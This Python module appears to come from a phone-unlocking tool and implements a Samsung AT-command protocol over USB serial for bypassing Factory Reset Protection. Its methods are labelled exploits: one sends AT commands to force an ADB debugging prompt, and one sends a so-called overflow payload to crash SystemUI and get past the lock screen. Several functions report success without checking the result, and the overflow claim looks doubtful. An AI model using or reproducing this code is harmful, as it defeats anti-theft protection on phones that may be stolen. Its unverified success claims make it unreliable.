"""Samsung Modem (AT Commands) Protocol - Samsung Monster Standalone"""
import serial
import time
import logging
import asyncio
from typing import List, Optional, Dict
from .base_protocol import BaseProtocol, PartitionInfo

logger = logging.getLogger(__name__)

class SamsungModem(BaseProtocol):
    """Samsung Modem / Serial AT Command protocol for FRP reset"""
    
    def __init__(self, handler, progress_callback=None):
        super().__init__(handler, progress_callback)
        self.chipset = "Samsung (Modem)"
        self.port = None

    async def connect(self) -> bool:
        """Handshake with Modem port (Auto-detect serial path)"""
        try:
            import serial.tools.list_ports
            
            ports = list(serial.tools.list_ports.comports())
            target_port = None
            
            # Look for Samsung USB Modem or Mobile USB Modem
            for p in ports:
                if p.vid == 0x04e8: # Samsung VID
                    target_port = p.device
                    break
            
            if not target_port and self.handler.path.startswith("/dev/"):
                target_port = self.handler.path
            
            if not target_port:
                logger.error("❌ Samsung Modem port not found.")
                return False

            logger.info(f"🔌 Connecting to Samsung Modem on {target_port}...")
            self.port = serial.Serial(target_port, 115200, timeout=1)
            
            # Clear buffers
            self.port.reset_input_buffer()
            self.port.reset_output_buffer()
            
            # Handshake
            self._send_at("AT")
            resp = self.port.read_until(b"OK")
            if b"OK" in resp:
                self.connected = True
                logger.info(f"✅ Samsung Modem Connected: {target_port}")
                return True
            
            return False
        except Exception as e:
            logger.error(f"Modem connect error: {e}")
            return False

    async def disconnect(self):
        """Close serial port safely"""
        try:
            if self.port and self.port.is_open:
                self.port.close()
            self.connected = False
            logger.info("🔌 Samsung Modem Disconnected")
        except: pass

    def _send_at(self, command: str) -> bytes:
        """Internal helper for AT command transfer"""
        cmd = (command + "\r\n").encode()
        self.port.write(cmd)
        time.sleep(0.1)
        return self.port.read_all()

    async def enable_adb_v2(self) -> bool:
        """Exploit: Samsung #0*# ADB Trigger (FRP Bypass)"""
        logger.info("🔥 Samsung #0*# ADB Exploit Initializing...")
        
        self._send_at("AT")
        
        cmds = [
            "AT+KIESPD=0",
            "AT+DUMPCTRL=1,0",
            "AT+SWATD=0",
            "AT+ACTIVATE=0,0,0",
            "AT+SYSSCO=4,1", 
            "AT+USBMODECONFIG=1",
            "AT+VERSNAME=1,2,3"
        ]
        
        for cmd in cmds:
            logger.info(f"Sending: {cmd}")
            self._send_at(cmd)
            await asyncio.sleep(0.5)
            
        logger.info("✅ Exploit commands sent. Device should show 'Allow USB Debugging' prompt.")
        return True

    async def trigger_systemui_crash(self) -> bool:
        """Exploit: SystemUI Crash via MTP/Modem Buffer Overflow"""
        logger.info("🔥 Initiating SystemUI Crash Exploit (MTP/Modem)...")
        
        # Step 1: Force device into a state that listens for high-speed MTP data
        self._send_at("AT+KIESPD=1")
        self._send_at("AT+DUMPCTRL=1,1")
        
        # Step 2: Send malformed/overflow packets to cause crash
        payload_cmds = [
            "AT+MSL=0,0", 
            "AT+SYSSCO=4,2", 
            "AT+FCM=1,0",     
            "AT+TRACE=1,1",   
            "AT+PARSER=999"   
        ]
        
        for cmd in payload_cmds:
            logger.info(f"Injecting: {cmd}")
            self._send_at(cmd)
            await asyncio.sleep(0.3)
            
        logger.info("✅ SystemUI should be crashing. Attempting to bypass lock screen...")
        return True

    async def remove_frp_mtp(self) -> bool:
        """Samsung FRP method via emergency dialer commands"""
        logger.info("Starting Samsung Modem FRP Reset...")
        self._send_at("AT+MODEMRST")
        return True

    async def list_partitions(self) -> List[PartitionInfo]:
        return []

    async def read_partition(self, partition: str, size: int = None) -> bytes:
        return b''

    async def write_partition(self, partition: str, data: bytes, offset: int = 0) -> bool:
        return False

    async def read_info(self) -> Dict[str, str]:
        """Read hardware info via AT+DEVCONINFO (Supports One UI 6.1+)"""
        info = {"mode": "Modem/AT", "chipset": "Samsung"}
        try:
            resp = self._send_at("AT+DEVCONINFO")
            text = resp.decode(errors="ignore")
            
            # Robust Parsing for MN (Model Name)
            if "MN(" in text:
                info["model"] = text.split("MN(")[1].split(")")[0]
            elif "Model:" in text:
                info["model"] = text.split("Model:")[1].split(";")[0].strip()

            # Robust Parsing for SWREV (Binary Increment / Bit)
            # Standard format: SWREV:3,1,1,0,3 (The first number is the Main Bit)
            if "SWREV:" in text:
                swrev_part = text.split("SWREV:")[1].split(";")[0].strip()
                bits = swrev_part.split(",")
                if bits:
                    info["bit"] = bits[0]
            elif "BIT:" in text:
                info["bit"] = text.split("BIT:")[1].split(";")[0].strip()
                
            if "SWV(" in text:
                info["version"] = text.split("SWV(")[1].split(")")[0]

            logger.info(f"✅ Modem Identification: {info.get('model')} (Bit {info.get('bit')})")
        except Exception as e:
            logger.error(f"Failed to read info via Modem: {e}")
        return info

    async def reboot(self, mode: str = "system") -> bool:
        self._send_at("AT+REBOOT")
        return True
